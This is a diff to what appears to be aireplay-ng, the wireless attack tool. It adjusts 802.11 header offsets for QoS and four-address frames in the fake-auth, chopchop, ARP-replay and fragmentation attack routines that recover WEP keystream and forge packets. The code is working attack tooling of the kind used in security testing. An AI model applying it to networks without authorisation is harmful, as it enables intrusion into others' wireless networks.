@@ -1354,7 +1354,7 @@ int do_attack_fake_auth( void )
     struct timeval tv, tv2, tv3;
 
     fd_set rfds;
-    int i, n, state, caplen;
+    int i, n, state, caplen, z;
     int mi_b, mi_s, mi_d;
     int x_send;
 //     int ret;
@@ -1429,14 +1429,18 @@ int do_attack_fake_auth( void )
                         while(keystreamlen < 16)
                         {
                             capture_ask_packet(&caplen, 1);    //wait for data packet
-                            memcpy(iv, h80211+24, 4); //copy IV+IDX
-                            i = known_clear(keystream, &keystreamlen, weight, h80211, caplen-24-4-4); //recover first bytes
+                            z = ( ( h80211[1] & 3 ) != 3 ) ? 24 : 30;
+                            if ( ( h80211[0] & 0x80 ) == 0x80 ) /* QoS */
+                                z+=2;
+
+                            memcpy(iv, h80211+z, 4); //copy IV+IDX
+                            i = known_clear(keystream, &keystreamlen, weight, h80211, caplen-z-4-4); //recover first bytes
                             if(i>1)
                             {
                                 keystreamlen=0;
                             }
                             for(i=0;i<keystreamlen;i++)
-                                keystream[i] ^= h80211[i+28];
+                                keystream[i] ^= h80211[i+z+4];
                         }
                     }
                     else
@@ -2038,7 +2042,7 @@ int do_attack_fake_auth( void )
 
 int do_attack_interactive( void )
 {
-    int caplen, n;
+    int caplen, n, z;
     int mi_b, mi_s, mi_d;
     struct timeval tv;
     struct timeval tv2;
@@ -2051,6 +2055,10 @@ read_packets:
 
     if( capture_ask_packet( &caplen, 0 ) != 0 )
         return( 1 );
+
+    z = ( ( h80211[1] & 3 ) != 3 ) ? 24 : 30;
+    if ( ( h80211[0] & 0x80 ) == 0x80 ) /* QoS */
+        z+=2;
 
     /* rewrite the frame control & MAC addresses */
 
@@ -3032,6 +3040,8 @@ read_packets:
         return( 1 );
 
     z = ( ( h80211[1] & 3 ) != 3 ) ? 24 : 30;
+    if ( ( h80211[0] & 0x80 ) == 0x80 ) /* QoS */
+        z+=2;
 
     if(caplen < z)
     {
@@ -3077,8 +3087,8 @@ read_packets:
 
     /* check if it's a potential ARP request */
 
-    //its length 68 or 86 and going to broadcast or a unicast mac (even first byte)
-    if( (caplen == 68 || caplen == 86) && (memcmp(dmac, BROADCAST, 6) == 0 || (dmac[0]%2) == 0) )
+    //its length 68-24 or 86-24 and going to broadcast or a unicast mac (even first byte)
+    if( (caplen-z == 68-24 || caplen-z == 86-24) && (memcmp(dmac, BROADCAST, 6) == 0 || (dmac[0]%2) == 0) )
     {
         /* process ARP */
         printf("Found ARP packet\n");
@@ -3328,6 +3338,10 @@ int do_attack_chopchop( void )
     if( capture_ask_packet( &caplen, 0 ) != 0 )
         return( 1 );
 
+    z = ( ( h80211[1] & 3 ) != 3 ) ? 24 : 30;
+    if ( ( h80211[0] & 0x80 ) == 0x80 ) /* QoS */
+        z+=2;
+
     if( (unsigned)caplen > sizeof(srcbuf) || (unsigned)caplen > sizeof(h80211) )
         return( 1 );
 
@@ -3344,9 +3358,9 @@ int do_attack_chopchop( void )
         packet[0] = 0x08; //make it a data packet
         packet[1] = 0x41; //set encryption and ToDS=1
 
-        memcpy( packet+24, h80211+24, caplen-24);
+        memcpy( packet+24, h80211+z, caplen-z);
 
-        if( send_packet( packet, caplen ) != 0 )
+        if( send_packet( packet, caplen-z+24 ) != 0 )
             return( 1 );
         //done sending a correct packet
     }
@@ -3367,8 +3381,6 @@ int do_attack_chopchop( void )
     memcpy( srcbuf, h80211, caplen );
 
     /* setup the chopping buffer */
-
-    z = ( ( h80211[1] & 3 ) != 3 ) ? 24 : 30;
 
     n = caplen - z + 24;
 
@@ -3991,6 +4003,7 @@ int do_attack_fragment()
     int gotit;
     int acksgot;
     int packets;
+    int z;
 
     uchar *snap_header = (unsigned char*)"\xAA\xAA\x03\x00\x00\x00\x08\x00";
 
@@ -4031,6 +4044,10 @@ int do_attack_fragment()
         if( capture_ask_packet( &caplen, 0 ) != 0 )
             return -1;
 
+        z = ( ( h80211[1] & 3 ) != 3 ) ? 24 : 30;
+        if ( ( h80211[0] & 0x80 ) == 0x80 ) /* QoS */
+            z+=2;
+
         if((unsigned)caplen > sizeof(packet) || (unsigned)caplen > sizeof(packet2))
             continue;
 
@@ -4041,9 +4058,9 @@ int do_attack_fragment()
         if ( memcmp( packet2 +  4, SPANTREE, 6 ) == 0 ||
              memcmp( packet2 + 16, SPANTREE, 6 ) == 0 )
         {
-            packet2[28] = ((packet2[28] ^ 0x42) ^ 0xAA);  //0x42 instead of 0xAA
-            packet2[29] = ((packet2[29] ^ 0x42) ^ 0xAA);  //0x42 instead of 0xAA
-            packet2[34] = ((packet2[34] ^ 0x00) ^ 0x08);  //0x00 instead of 0x08
+            packet2[z+4] = ((packet2[z+4] ^ 0x42) ^ 0xAA);  //0x42 instead of 0xAA
+            packet2[z+5] = ((packet2[z+5] ^ 0x42) ^ 0xAA);  //0x42 instead of 0xAA
+            packet2[z+6] = ((packet2[z+6] ^ 0x00) ^ 0x08);  //0x00 instead of 0x08
         }
 
         prga_len = 7;
@@ -4052,8 +4069,8 @@ int do_attack_fragment()
 
         memcpy( packet, packet2, caplen2 );
         caplen = caplen2;
-        memcpy(prga, packet+28, prga_len);
-        memcpy(iv, packet+24, 4);
+        memcpy(prga, packet+z+4, prga_len);
+        memcpy(iv, packet+z, 4);
 
         xor_keystream(prga, snap_header, prga_len);
 
@@ -4087,6 +4104,9 @@ int do_attack_fragment()
             while (!gotit)  //waiting for relayed packet
             {
                 caplen = read_packet(packet, sizeof(packet), NULL);
+                z = ( ( packet[1] & 3 ) != 3 ) ? 24 : 30;
+                if ( ( packet[0] & 0x80 ) == 0x80 ) /* QoS */
+                    z+=2;
 
                 if (packet[0] == 0xD4 )
                 {
@@ -4097,7 +4117,7 @@ int do_attack_fragment()
                     continue;
                 }
 
-                if (packet[0] == 0x08 && (( packet[1] & 0x40 ) == 0x40) ) //Is data frame && encrypted
+                if ((packet[0] & 0x08) && (( packet[1] & 0x40 ) == 0x40) ) //Is data frame && encrypted
                 {
                     if ( (packet[1] & 2) )  //Is a FromDS packet
                     {
@@ -4105,7 +4125,7 @@ int do_attack_fragment()
                         {
                             if (! memcmp(opt.r_smac, packet+16, 6)) //From our MAC
                             {
-                                if (caplen < 90)  //Is short enough
+                                if (caplen-z < 66)  //Is short enough
                                 {
                                     //This is our relayed packet!
                                     PCT; printf("Got RELAYED packet!!\n");
@@ -4159,12 +4179,12 @@ int do_attack_fragment()
         if(again == NEW_IV) continue;
 
         make_arp_request(h80211, opt.f_bssid, opt.r_smac, opt.r_dmac, opt.r_sip, opt.r_dip, 60);
-        if (caplen == 68)
+        if (caplen-z == 68-24)
         {
             //Thats the ARP packet!
 //             PCT; printf("Thats our ARP packet!\n");
         }
-        if (caplen == 71)
+        if (caplen-z == 71-24)
         {
             //Thats the LLC NULL packet!
 //             PCT; printf("Thats our LLC Null packet!\n");
@@ -4186,16 +4206,16 @@ int do_attack_fragment()
             memcpy(ct+32, opt.r_sip,   4);
 
             //Calculating
-            memcpy(prga, packet+28, 36);
+            memcpy(prga, packet+z+4, 36);
             xor_keystream(prga, ct, 36);
         }
         else
         {
-            memcpy(prga, packet+28, 36);
+            memcpy(prga, packet+z+4, 36);
             xor_keystream(prga, h80211+24, 36);
         }
 
-        memcpy(iv, packet+24, 4);
+        memcpy(iv, packet+z, 4);
         round = 0;
         again = RETRY;
         while(again == RETRY)
@@ -4229,6 +4249,9 @@ int do_attack_fragment()
             while (!gotit)  //waiting for relayed packet
             {
                 caplen = read_packet(packet, sizeof(packet), NULL);
+                z = ( ( packet[1] & 3 ) != 3 ) ? 24 : 30;
+                if ( ( packet[0] & 0x80 ) == 0x80 ) /* QoS */
+                    z+=2;
 
                 if (packet[0] == 0xD4 )
                 {
@@ -4237,7 +4260,7 @@ int do_attack_fragment()
                     continue;
                 }
 
-                if (packet[0] == 0x08 && (( packet[1] & 0x40 ) == 0x40) ) //Is data frame && encrypted
+                if ((packet[0] & 0x08) && (( packet[1] & 0x40 ) == 0x40) ) //Is data frame && encrypted
                 {
                     if ( (packet[1] & 2) )  //Is a FromDS packet with valid IV
                     {
@@ -4245,7 +4268,7 @@ int do_attack_fragment()
                         {
                             if (! memcmp(opt.r_smac, packet+16, 6)) //From our MAC
                             {
-                                if (caplen > 400 && caplen < 500)  //Is short enough
+                                if (caplen-z > 400-24 && caplen-z < 500-24)  //Is short enough
                                 {
                                     //This is our relayed packet!
                                     PCT; printf("Got RELAYED packet!!\n");
@@ -4299,20 +4322,20 @@ int do_attack_fragment()
         if(again == NEW_IV) continue;
 
         make_arp_request(h80211, opt.f_bssid, opt.r_smac, opt.r_dmac, opt.r_sip, opt.r_dip, 408);
-        if (caplen == 416)
+        if (caplen-z == 416-24)
         {
             //Thats the ARP packet!
 //             PCT; printf("Thats our ARP packet!\n");
         }
-        if (caplen == 448)
+        if (caplen-z == 448-24)
         {
             //Thats the LLC NULL packet!
 //             PCT; printf("Thats our LLC Null packet!\n");
             memset(h80211+24, '\x00', 416);
         }
 
-        memcpy(iv, packet+24, 4);
-        memcpy(prga, packet+28, 384);
+        memcpy(iv, packet+z, 4);
+        memcpy(prga, packet+z+4, 384);
         xor_keystream(prga, h80211+24, 384);
 
         round = 0;
@@ -4347,6 +4370,9 @@ int do_attack_fragment()
             while (!gotit)  //waiting for relayed packet
             {
                 caplen = read_packet(packet, sizeof(packet), NULL);
+                z = ( ( packet[1] & 3 ) != 3 ) ? 24 : 30;
+                if ( ( packet[0] & 0x80 ) == 0x80 ) /* QoS */
+                    z+=2;
 
                 if (packet[0] == 0xD4 )
                 {
@@ -4355,7 +4381,7 @@ int do_attack_fragment()
                     continue;
                 }
 
-                if (packet[0] == 0x08 && (( packet[1] & 0x40 ) == 0x40) ) //Is data frame && encrypted
+                if ((packet[0] & 0x08) && (( packet[1] & 0x40 ) == 0x40) ) //Is data frame && encrypted
                 {
                     if ( (packet[1] & 2) )  //Is a FromDS packet with valid IV
                     {
@@ -4363,7 +4389,7 @@ int do_attack_fragment()
                         {
                             if (! memcmp(opt.r_smac, packet+16, 6)) //From our MAC
                             {
-                                if (caplen > 1496)  //Is short enough
+                                if (caplen-z > 1496-24)  //Is short enough
                                 {
                                     //This is our relayed packet!
                                     PCT; printf("Got RELAYED packet!!\n");
@@ -4429,12 +4455,12 @@ int do_attack_fragment()
         else length = 1500;
 
         make_arp_request(h80211, opt.f_bssid, opt.r_smac, opt.r_dmac, opt.r_sip, opt.r_dip, length);
-        if (caplen == length+8+24)
+        if (caplen == length+8+z)
         {
             //Thats the ARP packet!
 //             PCT; printf("Thats our ARP packet!\n");
         }
-        if (caplen == length+40)
+        if (caplen == length+16+z)
         {
             //Thats the LLC NULL packet!
 //             PCT; printf("Thats our LLC Null packet!\n");
@@ -4443,8 +4469,8 @@ int do_attack_fragment()
 
         if(again != ABORT)
         {
-            memcpy(iv, packet+24, 4);
-            memcpy(prga, packet+28, length);
+            memcpy(iv, packet+z, 4);
+            memcpy(prga, packet+z+4, length);
             xor_keystream(prga, h80211+24, length);
         }
 
@@ -4455,7 +4481,7 @@ int do_attack_fragment()
                   "fragment-%02d%02d-%02d%02d%02d.xor",
                   lt->tm_mon + 1, lt->tm_mday,
                   lt->tm_hour, lt->tm_min, lt->tm_sec );
-        save_prga(strbuf, iv, prga, length+24);
+        save_prga(strbuf, iv, prga, length);
 
         printf( "Saving keystream in %s\n", strbuf );
         printf("Now you can build a packet with packetforge-ng out of that %d bytes keystream\n", length);
@@ -5437,7 +5463,7 @@ int do_attack_test()
                 h80211[26] = 0x2E;
                 h80211[27] = 0x00;
 
-                //random crap (as encrypted data)
+                //random bytes (as encrypted data)
                 for(j=0; j<7; j++)
                     h80211[28+j] = rand() & 0xFF;
 
